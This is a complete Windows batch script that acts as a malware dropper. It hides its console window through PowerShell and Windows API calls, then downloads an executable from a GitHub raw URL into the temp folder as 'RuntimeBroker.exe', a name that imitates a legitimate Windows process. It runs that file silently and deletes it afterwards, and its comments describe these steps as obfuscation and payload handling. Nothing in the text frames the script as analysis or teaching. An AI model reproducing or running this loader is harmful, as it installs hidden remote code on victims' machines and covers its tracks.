@echo off
:: Variables to hide commands and file names
set "p1=powershell -Command"
set "p2=Add-Type -Name Window -Namespace Console -MemberDefinition"
set "p3=[DllImport(^"Kernel32.dll^")]public static extern IntPtr GetConsoleWindow();"
set "p4=[DllImport(^"user32.dll^")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);"
set "d1=Invoke-WebRequest"
set "url=https://github.com/69roseray/work/raw/refs/heads/main/Runtime.exe"
set "outFile=%TEMP%\RuntimeBroker.exe"

:: Obfuscated command to hide the command window
%p1% %p2% '%p3% %p4%' ; $console = [Console.Window]::GetConsoleWindow(); [Console.Window]::ShowWindow($console, 0)

:: Obfuscated command to download the payload
echo %~nx0 is downloading payload...
%p1% %d1% -Uri "%url%" -OutFile "%outFile%"

:: Obfuscated command to execute the payload
echo Running downloaded payload...
start /b "" "%outFile%"

:: Wait and clean-up the payload file
timeout /t 6 /nobreak >nul
del "%outFile%"

:: Exit the obfuscated script
exit
